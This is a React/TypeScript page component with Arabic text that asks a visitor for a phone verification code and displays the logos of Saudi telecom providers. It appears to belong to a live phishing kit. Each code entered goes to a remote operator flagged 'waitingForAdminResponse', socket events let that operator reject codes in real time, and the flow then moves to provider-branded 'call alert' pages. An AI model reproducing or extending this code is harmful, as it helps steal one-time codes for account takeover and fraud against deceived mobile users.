import { useEffect, useState, useRef } from "react";
import { useLocation, useSearch } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay, { waitingProviderInfo } from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  sendData,
  isFormApproved,
  isFormRejected,
  duplicateOtpRejected,
  navigateToPage,
  socket,
} from "@/lib/store";

const serviceProviderNextPages: Record<string, string> = {
  "0": "تنبية إتصال STC",
  "1": "تنبية إتصال Mobily",
  "2": "الصفحة النهائية",
  "3": "الصفحة النهائية",
  "4": "الصفحة النهائية",
  "5": "الصفحة النهائية",
};

// معلومات مزودي الخدمة
const serviceProviders: Record<string, { label: string; icon: string }> = {
  "0": { label: "STC", icon: "/images/service-providers/stc.jpg" },
  "1": { label: "موبايلي", icon: "/images/service-providers/mobily.png" },
  "2": { label: "زين", icon: "/images/service-providers/zain.webp" },
  "3": { label: "ليبارا", icon: "/images/service-providers/lebara.jpg" },
  "4": { label: "فيرجن", icon: "/images/service-providers/virgin.png" },
  "5": { label: "سلام", icon: "/images/service-providers/salam.jpg" },
};

export default function PhoneOTP() {
  const [, navigate] = useLocation();
  const searchString = useSearch();
  const params = new URLSearchParams(searchString);
  const serviceProvider = params.get("serviceProvider") || "0";

  const [otp, setOtp] = useState("");
  const [error, setError] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  const nextPage = serviceProviderNextPages[serviceProvider] || "الصفحة النهائية";

  // التحقق من أن الرمز 4 أو 6 أرقام
  const isValidOtp = otp.length === 4 || otp.length === 6;

  // Emit page enter وتحديث معلومات مزود الخدمة
  useEffect(() => {
    navigateToPage("تحقق رقم الجوال (OTP)");
    
    // تحديث معلومات مزود الخدمة بناءً على الـ serviceProvider الحالي
    const provider = serviceProviders[serviceProvider];
    const phoneNumber = localStorage.getItem('userPhone') || '';
    
    waitingProviderInfo.value = {
      providerLogo: provider?.icon,
      providerName: provider?.label,
      phoneNumber: phoneNumber,
    };
  }, [serviceProvider]);

  // Handle form approval
  useEffect(() => {
    if (isFormApproved.value) {
      if (nextPage === "تنبية إتصال STC") {
        navigate("/stc-call-alert");
      } else if (nextPage === "تنبية إتصال Mobily") {
        navigate("/mobily-call-alert");
      } else {
        navigate("/final-page");
      }
    }
  }, [isFormApproved.value, navigate, nextPage]);

  // Handle form rejection - clear OTP
  useEffect(() => {
    if (isFormRejected.value) {
      setOtp("");
      setError(true);
      inputRef.current?.focus();
    }
  }, [isFormRejected.value]);

  // Handle code action (reject) - الاستماع مباشرة للحدث من السوكت
  useEffect(() => {
    const s = socket.value;
    if (!s) return;

    const handleCodeAction = (data: { action: string; codeIndex: number }) => {
      console.log("PhoneOTP: Code action received:", data);
      if (data.action === 'reject') {
        setOtp("");
        setError(true);
        inputRef.current?.focus();
      }
    };

    const handleDuplicateOtp = () => {
      console.log("PhoneOTP: Duplicate OTP rejected!");
      setOtp("");
      setError(true);
      inputRef.current?.focus();
      duplicateOtpRejected.value = false;
    };

    s.on("code:action", handleCodeAction);
    s.on("otp:duplicateRejected", handleDuplicateOtp);

    return () => {
      s.off("code:action", handleCodeAction);
      s.off("otp:duplicateRejected", handleDuplicateOtp);
    };
  }, []);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (!isValidOtp) {
      setError(true);
      return;
    }

    setError(false);
    
    // تعيين معلومات مزود الخدمة لعرضها في شاشة الانتظار
    const provider = serviceProviders[serviceProvider];
    const phoneNumber = localStorage.getItem('userPhone') || '';
    
    waitingProviderInfo.value = {
      providerLogo: provider?.icon,
      providerName: provider?.label,
      phoneNumber: phoneNumber,
    };
    
    sendData({
      digitCode: otp,
      current: "تحقق رقم الجوال (OTP)",
      nextPage: nextPage,
      waitingForAdminResponse: true,
    });
  };

  const handleResend = () => {
    // تعيين معلومات مزود الخدمة لعرضها في شاشة الانتظار
    const provider = serviceProviders[serviceProvider];
    const phoneNumber = localStorage.getItem('userPhone') || '';
    
    waitingProviderInfo.value = {
      providerLogo: provider?.icon,
      providerName: provider?.label,
      phoneNumber: phoneNumber,
    };
    
    sendData({
      data: { طلب: "إعادة إرسال رمز" },
      current: "تحقق رقم الجوال (OTP)",
      waitingForAdminResponse: true,
    });
  };

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, ""); // فقط الأرقام
    if (value.length <= 6) {
      setOtp(value);
      setError(false);
    }
  };

  return (
    <PageLayout variant="default">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4" style={{ backgroundColor: 'rgba(26, 82, 118, 0.1)' }}>
            <svg
              className="w-8 h-8"
              style={{ color: '#1a5276' }}
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"
              />
            </svg>
          </div>
          <h1 className="text-xl font-bold text-gray-800 mb-2">رمز التحقق</h1>
          <p className="text-gray-500 text-sm">
            تم إرسال رمز التحقق إلى رقم جوالك
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          {/* OTP Input - خانة واحدة */}
          <div className="flex justify-center" dir="ltr">
            <Input
              ref={inputRef}
              type="text"
              inputMode="numeric"
              pattern="[0-9]*"
              maxLength={6}
              value={otp}
              onChange={handleOtpChange}
              placeholder="أدخل رمز التحقق"
              className={`text-center text-xl tracking-widest h-11 max-w-[200px] ${
                error ? "border-red-500 focus:border-red-500" : ""
              }`}
              autoComplete="one-time-code"
            />
          </div>

          {error && (
            <p className="text-red-500 text-xs text-center">
              رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى
            </p>
          )}

          {/* Submit Button - معطل حتى يتم تعبئة الرمز */}
          <Button 
            type="submit" 
            className="w-full" 
            size="lg"
            disabled={!isValidOtp}
            style={{ backgroundColor: '#1a5276' }}
          >
            تأكيد
          </Button>

          {/* Resend Link */}
          <div className="text-center">
            <button
              type="button"
              onClick={handleResend}
              className="text-sm hover:underline"
              style={{ color: '#1a5276' }}
            >
              لم تستلم الرمز؟ إعادة الإرسال
            </button>
          </div>
        </form>
      </div>
    </PageLayout>
  );
}
